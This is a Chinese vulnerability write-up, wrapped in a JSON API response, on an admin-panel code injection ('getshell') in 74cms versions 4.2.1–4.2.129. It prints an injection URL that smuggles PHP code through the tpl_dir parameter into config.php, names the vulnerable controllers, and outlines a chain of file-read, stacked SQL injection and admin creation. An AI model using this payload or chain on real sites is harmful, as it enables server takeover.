{'success': True, 'code': 200, 'message': '操作成功', 'data': '<h1 id="74cms-v421-v42129-后台getshell漏洞">74cms v4.2.1-v4.2.129-后台getshell漏洞</h1>\n<h2 id="0x00-前言">0x00 前言</h2>\n<p>厂商：74cms<br />下载地址：http://www.74cms.com/download/index.html<br />关于版本：<br />新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。<br />注：此漏洞不用升级至最新版本也可使用。</p>\n<h2 id="0x01-74cms升级到最新版">0x01 74cms升级到最新版</h2>\n<p>1，    先去官网下载 骑士人才系统基础版(安装包)<br />2，    将下载好的包进行安装<br />3，    进入后台点击查看如果不是最新版的话，请点击升级！<br />4，    如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决<br />5，    搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php<br />6，    查找所有$_SERVER[\'HTTP_HOST\'] 改为  http://baidu.com 即可</p>\n<h2 id="0x02漏洞演示">0x02漏洞演示</h2>\n<p><img src="/img/20200419/c1770686c5fa40408cce01340b7026d6.png" alt="image" class="large" onclick="window.open(this.src)" /></p>\n<pre><code class="language-html">url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= \', \'a\',phpinfo(),\'\n\nshell:http://74cms.test/Application/Home/Conf/config.php\n路径：\\74cms\\upload\\Application\\Home\\Conf\\config.php\n</code></pre>\n<p><img src="/img/20200419/6891a4dcd71f4b2c9e86d344d4649c9f.png" alt="image" class="large" onclick="window.open(this.src)" /></p>\n<p><img src="/img/20200419/efd93113ddb744c39ffbbe70468a4503.png" alt="image" class="large" onclick="window.open(this.src)" /></p>\n<h2 id="0x03-漏洞原理">0x03 漏洞原理</h2>\n<pre><code class="language-html">url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= \', \'a\',phpinfo(),\'\n路径：74cms\\upload\\Application\\Admin\\Controller\\TplController.class.php\n</code></pre>\n<p><img src="/img/20200419/6386ddd795944a81b80bbc58b7a4feed.png" alt="image" class="large" onclick="window.open(this.src)" /></p>\n<pre><code>路径： 74cms\\upload\\Application\\Common\\Controller\\BackendController.class.php\n</code></pre>\n<p><img src="/img/20200419/c6f47da31b2a4781a22efab76b639d4a.png" alt="image" class="large" onclick="window.open(this.src)" /></p>\n<h2 id="0x04题外话-认真版getshell方法">0x04题外话-认真版getshell方法</h2>\n<p>认真版getshell方法：<br />实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。<br />首先利用-任意文件读取漏洞-读取系统中的hash值<br />然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户<br />在通过这个后台getshell漏洞<br />即可完成一套日穿</p>\n<h2 id="四参考链接">四、参考链接</h2>\n<blockquote>\n<p>https://www.yuque.com/pmiaowu/bfgkkh/wecilm</p>\n</blockquote>\n'}
